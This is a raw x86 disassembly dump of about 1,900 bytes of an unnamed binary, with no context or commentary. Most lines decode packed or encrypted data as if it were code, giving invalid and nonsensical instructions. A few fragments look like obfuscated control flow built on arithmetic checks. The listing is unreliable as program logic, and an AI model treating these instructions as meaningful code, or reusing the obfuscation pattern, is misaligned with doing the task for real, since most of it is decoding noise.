  40ba09:	jb     0x40b9fc
  40ba0b:	jge    0x40b9ac
  40ba0d:	pop    edi
  40ba0e:	ds loop 0x40ba1a
  40ba11:	out    dx,eax
  40ba12:	data16 add BYTE PTR [edi+0x24],ah
  40ba16:	pop    esi
  40ba17:	test   BYTE PTR [ecx-0x417eb187],ch
  40ba1d:	push   ebx
  40ba1e:	je     0x40b9ea
  40ba20:	pop    ss
  40ba21:	nop
  40ba22:	xor    ah,BYTE PTR [ecx]
  40ba24:	cmp    BYTE PTR [ebp-0x26],dh
  40ba27:	enter  0x4658,0x1
  40ba2b:	pop    ebx
  40ba2c:	addr16 pushf 
  40ba2e:	(bad)  
  40ba2f:	adc    eax,0x94118e46
  40ba34:	stos   DWORD PTR es:[edi],eax
  40ba35:	add    dl,BYTE PTR [esi-0x1b]
  40ba38:	cmp    BYTE PTR [edx],0xed
  40ba3b:	mov    al,0xa2
  40ba3d:	pop    edx
  40ba3e:	and    al,0x84
  40ba40:	or     DWORD PTR [edi+ebx*4-0x50a28e7],ebx
  40ba47:	inc    edi
  40ba48:	push   ss
  40ba49:	jmp    0x40baa7
  40ba4b:	mov    DWORD PTR [edi*4-0x5739ce96],0x2a843c5f
  40ba56:	jecxz  0x40ba78
  40ba58:	pop    esi
  40ba59:	and    DWORD PTR [ebx],eax
  40ba5b:	ror    BYTE PTR [ebx+0x696b65f4],0xc9
  40ba62:	inc    ebx
  40ba63:	dec    esp
  40ba64:	jae    0x40bac8
  40ba66:	xor    BYTE PTR gs:[esi+ecx*8-0x43609a59],al
  40ba6e:	sub    DWORD PTR [edi-0x5e16ffb6],ecx
  40ba74:	vmulss xmm7,xmm6,DWORD PTR [eax+ecx*1+0x1f]
  40ba7a:	loop   0x40bab4
  40ba7c:	jp     0x40ba24
  40ba7e:	fisttp QWORD PTR [esi+0x7c2e779f]
  40ba84:	sub    eax,0xb7a7cd1f
  40ba89:	loop   0x40ba12
  40ba8b:	add    al,0xc
  40ba8d:	and    DWORD PTR [ebx],edi
  40ba8f:	mov    BYTE PTR [edx-0x29],bl
  40ba92:	inc    edx
  40ba93:	ins    DWORD PTR es:[edi],dx
  40ba94:	aas    
  40ba95:	fcom   DWORD PTR [ebx+0x5b04556d]
  40ba9b:	pop    edi
  40ba9c:	dec    edx
  40ba9d:	out    0xce,al
  40ba9f:	iret   
  40baa0:	fldenv [edx-0x65]
  40baa3:	mov    dh,BYTE PTR [ebp-0x3c]
  40baa6:	ret    
  40baa7:	fsub   st,st(5)
  40baa9:	pop    ecx
  40baaa:	mov    bh,0x77
  40baac:	adc    al,0x60
  40baae:	pop    ds
  40baaf:	pop    edi
  40bab0:	sti    
  40bab1:	add    eax,0x6b46f277
  40bab6:	mov    ebx,0x6bdc132b
  40babb:	retf   0xf60f
  40babe:	sub    DWORD PTR [ecx-0x4e],esi
  40bac1:	sbb    al,0xc8
  40bac3:	adc    al,0xcb
  40bac5:	pop    es
  40bac6:	rol    BYTE PTR [ebp-0x385695b2],0xd9
  40bacd:	pop    edx
  40bace:	popa   
  40bacf:	sti    
  40bad0:	bound  ebp,QWORD PTR [esi-0x5c6d7cfb]
  40bad6:	imul   edi,DWORD PTR [edx],0xffffffcf
  40bad9:	leave  
  40bada:	imul   BYTE PTR [esp+ebp*4+0x54b84432]
  40bae1:	mov    al,BYTE PTR [ebp+0x6c]
  40bae4:	fild   QWORD PTR [ecx]
  40bae6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bae7:	and    BYTE PTR [esi],dl
  40bae9:	adc    DWORD PTR [esp+esi*4-0x2f9a5063],esi
  40baf0:	pusha  
  40baf1:	xor    BYTE PTR ds:0x1c544803,bl
  40baf7:	int3   
  40baf8:	daa    
  40baf9:	xor    DWORD PTR [edx],esi
  40bafb:	int    0xb2
  40bafd:	cmp    esp,DWORD PTR ds:0x8249253e
  40bb03:	cmp    al,0x53
  40bb05:	rol    DWORD PTR [ebx-0x29],0xef
  40bb09:	mov    dh,0x67
  40bb0b:	fwait
  40bb0c:	(bad)  
  40bb0d:	jp     0x40bac9
  40bb0f:	mov    bl,al
  40bb11:	pop    es
  40bb12:	and    dl,0xd9
  40bb15:	addr16 dec ebp
  40bb17:	ret    0x9f0f
  40bb1a:	cs or  edi,eax
  40bb1d:	jp     0x40bac6
  40bb1f:	int    0xfd
  40bb21:	add    dh,bl
  40bb23:	and    eax,0xce0c5b43
  40bb28:	rcl    DWORD PTR [esi+0x2699c58],1
  40bb2e:	mov    cl,0x6c
  40bb30:	stos   BYTE PTR es:[edi],al
  40bb31:	lock inc esp
  40bb33:	jo     0x40bb89
  40bb35:	sub    ah,dl
  40bb37:	xchg   ecx,eax
  40bb38:	dec    edi
  40bb39:	adc    BYTE PTR [esi+0xe],0x7e
  40bb3d:	das    
  40bb3e:	dec    esp
  40bb3f:	aam    0x4
  40bb41:	mov    cl,0xf0
  40bb43:	rol    BYTE PTR [edi],cl
  40bb45:	mov    ch,0x21
  40bb47:	out    dx,eax
  40bb48:	sahf   
  40bb49:	mov    dh,0xc0
  40bb4b:	lea    eax,[eax+0x75]
  40bb4e:	and    edi,DWORD PTR [ecx]
  40bb50:	outs   dx,DWORD PTR ds:[esi]
  40bb51:	mov    bl,0x3c
  40bb53:	lods   eax,DWORD PTR ds:[esi]
  40bb54:	pusha  
  40bb55:	(bad)  
  40bb56:	in     eax,dx
  40bb57:	mov    ecx,0xdf31a7c3
  40bb5c:	xor    dh,BYTE PTR [eax]
  40bb5e:	fs into 
  40bb60:	aaa    
  40bb61:	stos   DWORD PTR es:[edi],eax
  40bb62:	jecxz  0x40bb6a
  40bb64:	ss inc eax
  40bb66:	cmp    DWORD PTR [eax],0x6b8a70c4
  40bb6c:	pop    ds
  40bb6d:	ret    
  40bb6e:	(bad)  
  40bb6f:	cmp    esp,DWORD PTR [edi-0x80]
  40bb72:	pop    edi
  40bb73:	daa    
  40bb74:	(bad)  
  40bb75:	stc    
  40bb76:	xchg   BYTE PTR [ebp-0x5564103],cl
  40bb7c:	pop    eax
  40bb7d:	mov    ah,0xe
  40bb7f:	nop
  40bb80:	test   al,0xbd
  40bb82:	xchg   edx,eax
  40bb83:	jns    0x40bbd9
  40bb85:	test   DWORD PTR [eax-0xe],edi
  40bb88:	add    ch,0x85
  40bb8b:	pop    edi
  40bb8c:	aam    0x6
  40bb8e:	imul   ebx,eax,0x7c
  40bb91:	pop    eax
  40bb92:	sub    DWORD PTR [esi-0x49],esp
  40bb95:	fisub  WORD PTR [eax+ecx*1-0x1fe16824]
  40bb9c:	xchg   esp,eax
  40bb9d:	sub    BYTE PTR [edx],ch
  40bb9f:	ja     0x40bb88
  40bba1:	adc    al,0xf
  40bba3:	mov    dh,0x25
  40bba5:	int3   
  40bba6:	inc    edx
  40bba7:	jmp    0xa91:0x1a1c28d1
  40bbae:	dec    esi
  40bbaf:	cld    
  40bbb0:	mov    dh,0x60
  40bbb2:	jmp    0x51603835
  40bbb7:	int    0xc
  40bbb9:	mov    ds:0x2807e6dc,eax
  40bbbe:	xor    edx,eax
  40bbc0:	pop    ds
  40bbc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbc2:	mov    edx,0xe466d47d
  40bbc7:	inc    ebp
  40bbc8:	bound  ebx,QWORD PTR ds:0xb66bd94d
  40bbce:	scas   eax,DWORD PTR es:[edi]
  40bbcf:	clc    
  40bbd0:	dec    ebp
  40bbd1:	pop    fs
  40bbd3:	xchg   esp,eax
  40bbd4:	pop    eax
  40bbd5:	(bad)
  40bbd9:	ret    
  40bbda:	loop   0x40bb96
  40bbdc:	add    eax,0xba4460aa
  40bbe1:	sbb    ebp,DWORD PTR [edi]
  40bbe3:	rcl    BYTE PTR [ebx],cl
  40bbe5:	lods   al,BYTE PTR ds:[esi]
  40bbe6:	iret   
  40bbe7:	and    esi,DWORD PTR ds:0xa779928e
  40bbed:	jns    0x40bbf9
  40bbef:	mov    ebx,0x7c64af12
  40bbf4:	mov    edi,0xce5e3036
  40bbf9:	jp     0x40bb87
  40bbfb:	mov    dh,0xe6
  40bbfd:	(bad)  
  40bbfe:	call   0x43b8:0x988e4925
  40bc05:	adc    ch,BYTE PTR [esi+0x12298bde]
  40bc0b:	pushf  
  40bc0c:	sub    BYTE PTR [ebx+eiz*2+0x46dac985],al
  40bc13:	dec    esp
  40bc14:	call   0xde7d556c
  40bc19:	mov    esi,DWORD PTR [esi+0x50de0467]
  40bc1f:	mov    eax,0x35de5b3c
  40bc24:	mov    edi,0x86456739
  40bc29:	lods   eax,DWORD PTR ds:[esi]
  40bc2a:	inc    ebx
  40bc2b:	std    
  40bc2c:	arpl   sp,si
  40bc2e:	mov    DWORD PTR [esi-0x6600c4ce],ecx
  40bc34:	lea    edx,[ecx]
  40bc36:	aaa    
  40bc37:	mov    dh,0xd0
  40bc39:	ins    DWORD PTR es:[edi],dx
  40bc3a:	enter  0x719f,0xa8
  40bc3e:	es in  eax,dx
  40bc40:	loope  0x40bca1
  40bc42:	sbb    eax,0x973ab75
  40bc47:	xchg   ebp,eax
  40bc48:	mov    bh,0xf3
  40bc4a:	mov    ebx,ecx
  40bc4c:	popa   
  40bc4d:	adc    ecx,DWORD PTR [eax-0x32ffbf10]
  40bc53:	(bad)  
  40bc54:	push   ebp
  40bc55:	jg     0x40bc8d
  40bc57:	mov    edi,0xb7340786
  40bc5c:	pop    esi
  40bc5d:	ret    0x21d6
  40bc60:	add    esp,esi
  40bc62:	in     eax,0x51
  40bc64:	repnz es push eax
  40bc67:	in     eax,dx
  40bc68:	pop    ds
  40bc69:	div    DWORD PTR [ecx+0x36]
  40bc6c:	mov    edx,0x9246484c
  40bc71:	aad    0x8c
  40bc73:	xor    DWORD PTR ds:[ecx-0x6cf2d2db],edx
  40bc7a:	popf   
  40bc7b:	pusha  
  40bc7c:	(bad)  
  40bc7d:	or     BYTE PTR [esi*8-0x4d7e6438],bl
  40bc84:	test   DWORD PTR [edx+edx*8+0x2c01f2b5],esi
  40bc8b:	rcr    BYTE PTR [eax-0x2299c392],0xb2
  40bc92:	mov    eax,ds:0xf5019489
  40bc97:	mov    edx,0xb6ef3640
  40bc9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc9d:	pop    edi
  40bc9e:	xchg   esi,eax
  40bc9f:	push   ss
  40bca0:	int    0xb3
  40bca2:	pop    ds
  40bca3:	in     al,0x8b
  40bca5:	test   al,0x2f
  40bca7:	pop    eax
  40bca8:	cmp    esp,ecx
  40bcaa:	jb     0x40bc8f
  40bcac:	pop    ecx
  40bcad:	inc    edi
  40bcae:	pop    eax
  40bcaf:	aad    0xd1
  40bcb1:	sbb    cl,BYTE PTR [edi+0x33]
  40bcb4:	pushf  
  40bcb5:	xchg   ebp,eax
  40bcb6:	push   0xffffffaf
  40bcb8:	mov    cl,0x27
  40bcba:	xor    BYTE PTR [ebx],ah
  40bcbc:	std    
  40bcbd:	add    BYTE PTR [ebx-0x5a],bl
  40bcc0:	ja     0x40bc90
  40bcc2:	(bad)  
  40bcc3:	mov    esp,0x4bb0d6ea
  40bcc8:	xchg   ebp,eax
  40bcc9:	clc    
  40bcca:	jns    0x40bc8f
  40bccc:	dec    ebp
  40bccd:	and    al,BYTE PTR [ebp+0x3e]
  40bcd0:	loopne 0x40bcc0
  40bcd2:	pop    ebp
  40bcd3:	fcomi  st,st(5)
  40bcd5:	cmp    al,BYTE PTR [eax-0x78]
  40bcd8:	jl     0x40bc73
  40bcda:	jo     0x40bc83
  40bcdc:	adc    ax,0xaf25
  40bce0:	ja     0x40bd2f
  40bce2:	shl    BYTE PTR [edi],0x92
  40bce5:	iret   
  40bce6:	pop    ebp
  40bce7:	retf   0xd6c1
  40bcea:	adc    ebp,esi
  40bcec:	jnp    0x40bcfa
  40bcee:	xor    DWORD PTR [edx-0x66],0xffffffc0
  40bcf2:	add    bh,BYTE PTR [ecx+0x2bf05d8b]
  40bcf8:	fistp  QWORD PTR [ebx]
  40bcfa:	fimul  DWORD PTR [edi]
  40bcfc:	xchg   DWORD PTR [eax],ecx
  40bcfe:	add    BYTE PTR [eax],al
  40bd00:	add    BYTE PTR [ebx-0x1a1633ab],cl
  40bd06:	add    eax,DWORD PTR [eax]
  40bd08:	add    BYTE PTR [ebx+0x7d8bc455],cl
  40bd0e:	cld    
  40bd0f:	xor    edx,eax
  40bd11:	xor    edi,eax
  40bd13:	add    edx,ecx
  40bd15:	add    edi,ecx
  40bd17:	imul   edx,edi
  40bd1a:	mov    edi,DWORD PTR [ebp-0x8]
  40bd1d:	mov    ebx,DWORD PTR [ebp-0x10]
  40bd20:	sub    ebx,edi
  40bd22:	cmp    ebx,edx
  40bd24:	mov    edx,DWORD PTR [ebp-0x38]
  40bd27:	jbe    0x40c0ee
  40bd2d:	jmp    0x40c0eb
  40bd32:	xchg   edx,eax
  40bd33:	dec    edx
  40bd34:	inc    edx
  40bd35:	inc    esp
  40bd36:	inc    edx
  40bd37:	push   esp
  40bd38:	xchg   edx,eax
  40bd39:	dec    edx
  40bd3a:	fdiv   DWORD PTR [edx+edi*8]
  40bd3d:	adc    cl,dl
  40bd3f:	mov    dl,0x58
  40bd41:	int3   
  40bd42:	(bad)  
  40bd43:	(bad)  
  40bd44:	jo     0x40bdb6
  40bd46:	lahf   
  40bd47:	jge    0x40bdb9
  40bd49:	jo     0x40bd2f
  40bd4b:	or     ebx,ebp
  40bd4d:	mov    ah,0x67
  40bd4f:	lds    ebp,FWORD PTR [eax]
  40bd51:	int3   
  40bd52:	jmp    0x17bf:0xa53ff3e0
  40bd59:	hlt    
  40bd5a:	adc    al,0x9b
  40bd5c:	not    DWORD PTR [ecx]
  40bd5e:	imul   esi,DWORD PTR [esp+ebx*8-0x1b5dc0f0],0xa544820a
  40bd69:	enter  0xb69d,0x72
  40bd6d:	push   0x64bf7ae3
  40bd72:	xor    dh,BYTE PTR [eax]
  40bd74:	in     eax,0xd
  40bd76:	cmp    esi,DWORD PTR [eax+0xf9c6feb]
  40bd7c:	ins    DWORD PTR es:[edi],dx
  40bd7d:	loopne 0x40bdb6
  40bd7f:	pop    edx
  40bd80:	and    al,BYTE PTR [esi]
  40bd82:	and    BYTE PTR [edi],cl
  40bd84:	retf   0x5ff8
  40bd87:	jmp    0xa95f:0x2ae424c0
  40bd8e:	jle    0x40bd58
  40bd90:	jg     0x40bdd0
  40bd92:	sbb    BYTE PTR [eax],0xf3
  40bd95:	pop    ebp
  40bd96:	mov    cl,0x1a
  40bd98:	(bad)  
  40bd99:	addr16 inc ebx
  40bd9b:	jne    0x40bd50
  40bd9d:	fst    DWORD PTR [ebx+ecx*1-0x7fc47b3c]
  40bda4:	gs jg  0x40bd51
  40bda7:	mov    edi,0xe395b392
  40bdac:	ins    BYTE PTR es:[edi],dx
  40bdad:	push   edx
  40bdae:	cmp    edx,DWORD PTR [edi]
  40bdb0:	je     0x40bdb5
  40bdb2:	xchg   al,bh
  40bdb4:	outs   dx,BYTE PTR ds:[esi]
  40bdb5:	aaa    
  40bdb6:	mov    ecx,0xa89348c
  40bdbb:	adc    eax,0x6ed4864
  40bdc0:	xor    cl,BYTE PTR [esi+0xb]
  40bdc3:	sahf   
  40bdc4:	cli    
  40bdc5:	push   esi
  40bdc6:	cld    
  40bdc7:	xor    DWORD PTR [eax-0x40d8b353],0xdb82f522
  40bdd1:	imul   ebp,DWORD PTR [edx+ecx*2+0x70dfc656],0xca90ae1e
  40bddc:	gs imul edx
  40bddf:	enter  0xc268,0x59
  40bde3:	adc    edi,edi
  40bde5:	test   DWORD PTR [ecx+0x6],esi
  40bde8:	pop    ecx
  40bde9:	inc    ebp
  40bdea:	pop    ds
  40bdeb:	xor    edi,edx
  40bded:	sbb    esp,DWORD PTR [eax]
  40bdef:	mov    ?,WORD PTR [esi-0x6f]
  40bdf2:	mov    dh,0x3a
  40bdf4:	pop    eax
  40bdf5:	push   0xed8b96fc
  40bdfa:	pushf  
  40bdfb:	dec    edx
  40bdfc:	out    0x7c,al
  40bdfe:	lods   al,BYTE PTR ds:[esi]
  40bdff:	aaa    
  40be00:	cmp    dh,BYTE PTR [ebp+0x5dfc62d]
  40be06:	js     0x40be6c
  40be08:	add    BYTE PTR [ebx-0x70],0xc0
  40be0c:	pushf  
  40be0d:	mov    al,ds:0x7c9f9bb4
  40be12:	ss dec edx
  40be14:	and    edx,eax
  40be16:	mov    bl,0x70
  40be18:	jns    0x40bdde
  40be1a:	add    DWORD PTR [eax+ecx*8+0x172ab77b],ebp
  40be21:	and    DWORD PTR ds:0xf305b610,0xffffff8d
  40be28:	rcr    DWORD PTR [edx],cl
  40be2a:	(bad)
  40be2d:	dec    ebx
  40be2e:	sub    BYTE PTR [ebp-0x1b7aa0b1],al
  40be34:	mov    dh,0xcc
  40be36:	fwait
  40be37:	push   es
  40be38:	fmul   DWORD PTR [eax+0x7222f7fa]
  40be3e:	mov    bh,0x59
  40be40:	sub    DWORD PTR [ebx+0x9],esp
  40be43:	out    dx,eax
  40be44:	repnz add esp,ebp
  40be47:	mov    eax,0x19e1ac3
  40be4c:	cmp    BYTE PTR [esi-0xc],0xe0
  40be50:	or     ah,BYTE PTR [edx-0x7f]
  40be53:	push   edi
  40be54:	fldcw  WORD PTR [edi-0x15b45bea]
  40be5a:	sbb    eax,0xfb474f32
  40be5f:	mov    ebx,0xf064377
  40be64:	icebp  
  40be65:	shl    DWORD PTR [edi-0x2fea7ab7],1
  40be6b:	sbb    dl,BYTE PTR [edi+eax*8+0x6f]
  40be6f:	jbe    0x40bdff
  40be71:	sbb    bl,BYTE PTR [eax+0x3e]
  40be74:	jns    0x40beb8
  40be76:	push   ds
  40be77:	push   edi
  40be78:	mov    bl,0xfb
  40be7a:	or     eax,0x9f2c8376
  40be7f:	sub    BYTE PTR [edx-0x5a],bh
  40be82:	mov    ds:0xd4446cb6,eax
  40be87:	jmp    0x377703f4
  40be8c:	dec    esp
  40be8d:	loop   0x40bea1
  40be8f:	fs repz jg 0x40befb
  40be93:	xchg   ebx,eax
  40be94:	adc    al,0x9e
  40be97:	fnsave [ebp+0x171158c8]
  40be9d:	adc    al,0xb3
  40be9f:	je     0x40bf0c
  40bea1:	pusha  
  40bea2:	or     BYTE PTR [eax+0xfdbf848],al
  40bea8:	sub    esi,DWORD PTR [ebp+0x3551feb4]
  40beae:	clc    
  40beaf:	and    BYTE PTR [esi],ah
  40beb1:	sub    DWORD PTR [ecx+0x169bd4c2],0xffffff92
  40beb8:	adc    BYTE PTR [eax+0x24],0x84
  40bebc:	mov    ds:0x65a3fae2,al
  40bec1:	xchg   esp,eax
  40bec2:	imul   ebx,DWORD PTR [edx],0xffffff9e
  40bec5:	stos   DWORD PTR es:[edi],eax
  40bec6:	jg     0x40bebf
  40bec8:	sub    cl,bl
  40beca:	dec    esp
  40becb:	dec    edi
  40becc:	add    eax,0x787b4fcb
  40bed1:	push   esp
  40bed2:	push   ebx
  40bed3:	dec    ebp
  40bed4:	mov    ch,0x62
  40bed6:	dec    BYTE PTR [ebx+0x1d0c9e7e]
  40bedc:	xchg   edi,eax
  40bedd:	scas   eax,DWORD PTR es:[edi]
  40bede:	cmp    ch,BYTE PTR [ebp-0x1c]
  40bee1:	enter  0x9c2a,0xa5
  40bee5:	dec    eax
  40bee6:	in     al,0xc7
  40bee8:	or     BYTE PTR [edi-0x11008202],dh
  40beee:	dec    ebx
  40beef:	and    al,0xb4
  40bef1:	dec    esp
  40bef2:	rcr    BYTE PTR [edx],0x52
  40bef5:	lahf   
  40bef6:	xor    ebp,DWORD PTR [edx]
  40bef8:	in     al,0xb7
  40befa:	sub    eax,DWORD PTR [ebp-0x2f]
  40befd:	mov    edx,0xd2b0dae7
  40bf02:	pop    edx
  40bf03:	jecxz  0x40bf1b
  40bf05:	fdiv   DWORD PTR [edx]
  40bf07:	sbb    eax,0x72246dec
  40bf0c:	pusha  
  40bf0d:	outs   dx,DWORD PTR ds:[esi]
  40bf0e:	cmc    
  40bf0f:	mov    ecx,0x43e39725
  40bf14:	enter  0xa2d0,0x6b
  40bf18:	add    BYTE PTR [edi+0x77],bh
  40bf1b:	test   DWORD PTR [ebp+0x5f14942d],eax
  40bf21:	sbb    al,0x4e
  40bf23:	pop    edx
  40bf24:	fld    QWORD PTR [esi-0x60]
  40bf27:	das    
  40bf28:	and    al,0x1
  40bf2a:	sub    edi,DWORD PTR [ebx-0xaf207ac]
  40bf30:	(bad)  
  40bf31:	fsubr  QWORD PTR [ecx-0x3953c5]
  40bf37:	cli    
  40bf38:	add    eax,0xf348822e
  40bf3d:	xchg   ebp,eax
  40bf3e:	pusha  
  40bf3f:	data16 mov dh,0xa3
  40bf42:	pushf  
  40bf43:	xor    dh,cl
  40bf45:	xchg   ebp,eax
  40bf46:	xchg   ecx,eax
  40bf47:	rcr    BYTE PTR [edx-0x23],cl
  40bf4a:	aad    0x5e
  40bf4c:	xchg   ecx,eax
  40bf4d:	push   ecx
  40bf4e:	sbb    eax,0x89f41d00
  40bf53:	xchg   edi,eax
  40bf54:	add    BYTE PTR [edi],0xbc
  40bf57:	lock sbb ch,BYTE PTR [ebx-0x22]
  40bf5b:	cmc    
  40bf5c:	rcr    BYTE PTR [ecx*8-0x73fbf769],0x16
  40bf64:	test   al,0x2b
  40bf66:	xchg   edi,eax
  40bf67:	aad    0x6d
  40bf69:	xchg   DWORD PTR [esi],ebx
  40bf6b:	push   ds
  40bf6c:	popa   
  40bf6d:	mov    cl,0x83
  40bf6f:	(bad)  
  40bf71:	and    DWORD PTR [ecx-0x6a],ecx
  40bf74:	xchg   ebx,eax
  40bf75:	xchg   ebp,eax
  40bf76:	and    bl,0x83
  40bf79:	cld    
  40bf7a:	push   edi
  40bf7b:	sbb    al,0x6c
  40bf7d:	scas   al,BYTE PTR es:[edi]
  40bf7e:	ficom  DWORD PTR [ebx+0x1e]
  40bf81:	mov    dl,0xb9
  40bf83:	lds    eax,FWORD PTR [ebp+ebx*1+0x12]
  40bf87:	mov    DWORD PTR [ebx+0x2cd11ed4],0xa9dd1738
  40bf91:	or     eax,0xbe7a4b32
  40bf96:	(bad)  
  40bf97:	ror    BYTE PTR [ebx+0x775466c9],1
  40bf9d:	stos   DWORD PTR es:[edi],eax
  40bf9e:	xchg   DWORD PTR [edx-0x425e8c5e],ebx
  40bfa4:	dec    esp
  40bfa5:	and    BYTE PTR [ecx-0x26],dl
  40bfa8:	rcl    dh,cl
  40bfaa:	in     al,dx
  40bfab:	clc    
  40bfac:	push   ecx
  40bfad:	call   0x6309:0x60bab675
  40bfb4:	out    0xa4,al
  40bfb6:	cwde   
  40bfb7:	mov    WORD PTR [eax+edx*2],ds
  40bfba:	jns    0x40bfc0
  40bfbc:	xchg   ecx,eax
  40bfbd:	or     ch,al
  40bfbf:	pusha  
  40bfc0:	inc    esi
  40bfc1:	das    
  40bfc2:	lea    esp,[edx+0x4b]
  40bfc5:	pop    ecx
  40bfc6:	retf   
  40bfc7:	mov    al,0xf8
  40bfc9:	fs jb  0x40bf79
  40bfcc:	sub    edx,esp
  40bfce:	inc    ebp
  40bfcf:	dec    esp
  40bfd0:	jecxz  0x40bf7f
  40bfd2:	adc    ch,BYTE PTR [esp+esi*1-0x68]
  40bfd6:	pop    es
  40bfd7:	xchg   ebp,eax
  40bfd8:	jbe    0x40bfff
  40bfda:	cmc    
  40bfdb:	cli    
  40bfdc:	out    0x43,al
  40bfde:	sub    esi,DWORD PTR [edi]
  40bfe0:	and    cl,al
  40bfe2:	inc    edx
  40bfe3:	scas   al,BYTE PTR es:[edi]
  40bfe4:	sbb    ebp,edi
  40bfe6:	test   DWORD PTR [eax],ebx
  40bfe8:	pmulhuw mm1,QWORD PTR [edi]
  40bfeb:	adc    edx,ebp
  40bfed:	adc    eax,DWORD PTR [edi+0x3f8d4013]
  40bff3:	call   0xea8db9f7
  40bff8:	or     DWORD PTR [esi+0x13],esi
  40bffb:	fidivr DWORD PTR [ecx-0x3b86d067]
  40c001:	xchg   esi,eax
  40c002:	pusha  
  40c003:	dec    edi
  40c004:	jle    0x40bf9a
  40c006:	push   ebx
  40c007:	jg     0x40bfd4
  40c009:	and    DWORD PTR [ebp+0x24210d55],edx
  40c00f:	sub    al,0x21
  40c011:	lds    ebx,FWORD PTR [ebp+0x3d]
  40c014:	repnz mov al,0x54
  40c017:	les    ebp,FWORD PTR [ecx-0x77]
  40c01a:	cmp    DWORD PTR [eax],eax
  40c01c:	fidivr WORD PTR [ebp+0x4a]
  40c01f:	rcr    ch,0x6c
  40c022:	sbb    eax,0x8720a7c2
  40c027:	lock dec eax
  40c029:	and    al,0xc6
  40c02b:	xchg   ebp,eax
  40c02c:	aaa    
  40c02d:	cmp    ebx,DWORD PTR [esi-0xd]
  40c030:	mov    esp,0xe545854e
  40c035:	pop    edx
  40c036:	jne    0x40c05b
  40c038:	jle    0x40c030
  40c03a:	push   cs
  40c03b:	je     0x40bfdc
  40c03d:	(bad)  
  40c03e:	sbb    eax,0xdefffcad
  40c043:	in     al,dx
  40c044:	mov    ecx,0x5272199b
  40c049:	jecxz  0x40c047
  40c04b:	push   es
  40c04c:	in     eax,dx
  40c04d:	sbb    DWORD PTR [ebp+0x791d918],ebp
  40c053:	es sbb ecx,edx
  40c056:	retf   0x9a87
  40c059:	scas   eax,DWORD PTR es:[edi]
  40c05a:	mov    dl,0xb9
  40c05c:	or     BYTE PTR [edx-0x12],dh
  40c05f:	sbb    al,0x9a
  40c061:	pop    esi
  40c062:	sub    bh,dh
  40c064:	scas   eax,DWORD PTR es:[edi]
  40c065:	test   BYTE PTR [ecx],0x76
  40c068:	call   0x56ab:0xcb8b6f0b
  40c06f:	div    DWORD PTR [ecx-0x4f0086d3]
  40c075:	mov    ecx,0x5e6bd9f0
  40c07a:	cmc    
  40c07b:	sbb    ecx,0x7aa83368
  40c081:	dec    ebp
  40c082:	push   esp
  40c083:	lods   eax,DWORD PTR ds:[esi]
  40c084:	in     al,dx
  40c085:	jecxz  0x40c00d
  40c087:	push   ecx
  40c088:	push   eax
  40c089:	out    0x23,al
  40c08b:	rcl    edx,cl
  40c08d:	sbb    bh,BYTE PTR [ecx+0x23e2b4ce]
  40c093:	arpl   WORD PTR [ebx],di
  40c095:	push   edi
  40c096:	repnz pop edx
  40c098:	pop    ebx
  40c099:	mov    edx,0xb58b6d45
  40c09e:	push   ecx
  40c09f:	icebp  
  40c0a0:	or     eax,0x47fd6753
  40c0a5:	pop    ss
  40c0a6:	mov    dh,0x33
  40c0a8:	mov    al,al
  40c0aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0ab:	ins    DWORD PTR es:[edi],dx
  40c0ac:	or     BYTE PTR [edx],ch
  40c0ae:	pop    esp
  40c0af:	hlt    
  40c0b0:	push   ebp
  40c0b1:	icebp  
  40c0b2:	mov    eax,0x2eefb3c8
  40c0b7:	mov    BYTE PTR [ebx],ch
  40c0b9:	test   eax,0xa2a37dae
  40c0be:	jns    0x40c077
  40c0c0:	jle    0x40c0f0
  40c0c2:	inc    esp
  40c0c3:	sbb    BYTE PTR [edi+esi*8],0xfb
  40c0c7:	jecxz  0x40c105
  40c0c9:	lds    esp,FWORD PTR [eax-0x6d220c22]
  40c0cf:	and    eax,0x84b1d3e6
  40c0d4:	call   0x9798:0x2f34d670
  40c0db:	rcr    cl,0x9f
  40c0de:	dec    edi
  40c0df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0e0:	pop    edx
  40c0e1:	mov    al,ds:0xf5312be7
  40c0e6:	int3   
  40c0e7:	xor    BYTE PTR [edx-0x3f],al
  40c0ea:	or     ecx,DWORD PTR [ebx+0x7d8bc455]
  40c0f0:	cld    
  40c0f1:	xor    edi,eax
  40c0f3:	xor    edx,eax
  40c0f5:	add    edi,ecx
  40c0f7:	add    edx,ecx
  40c0f9:	imul   edx,edi
  40c0fc:	mov    DWORD PTR [ebp+0xc],edx
  40c0ff:	mov    edx,DWORD PTR [ebp+0xc]
  40c102:	mov    DWORD PTR [ebp-0x24],edx
  40c105:	mov    edx,DWORD PTR [ebp-0x8]
  40c108:	add    edx,DWORD PTR [ebp-0x40]
  40c10b:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40c112:	mov    DWORD PTR [ebp-0x1c],edx
  40c115:	mov    DWORD PTR [ebp-0xc],0xf89c8530
  40c11c:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  40c123:	mov    edx,DWORD PTR [ebp-0x18]
  40c126:	xor    edx,eax
  40c128:	add    edx,ecx
  40c12a:	jmp    0x40ccd1
  40c12f:	mov    edx,DWORD PTR [ebp-0x18]
  40c132:	jmp    0x40c4f0
  40c137:	call   0x9a62:0x428402d0
  40c13e:	out    0xb8,al
  40c140:	mov    si,WORD PTR ds:[ebp+0x2e77054f]
  40c148:	mov    esi,DWORD PTR [eax+0x70]
  40c14b:	lahf   
  40c14c:	jge    0x40c1be
  40c14e:	jo     0x40c16b
  40c150:	mov    DWORD PTR [ecx],esp
  40c152:	mov    edi,DWORD PTR [eax+0x6a720df6]
  40c158:	jmp    0xc3df:0xfa99a3d4
  40c15f:	(bad)  
  40c160:	es pop esi
  40c162:	cmp    eax,0xa468c7b5
  40c167:	leave  
  40c168:	jno    0x40c18c
  40c16a:	int3   
  40c16b:	pushf  
  40c16c:	sub    ecx,DWORD PTR [eax+0x1e]
  40c16f:	int    0x2e
  40c171:	sbb    esp,DWORD PTR [edi+0x45]
  40c174:	dec    esi
  40c175:	jmp    0x40c179
  40c177:	aad    0x90
  40c179:	jecxz  0x40c138
  40c17b:	loopne 0x40c163
  40c17d:	dec    esi
  40c17e:	xor    BYTE PTR [ecx-0x8],dh
  40c181:	mov    ebp,0x78d40a02
  40c186:	push   esi
  40c187:	in     eax,0xbe
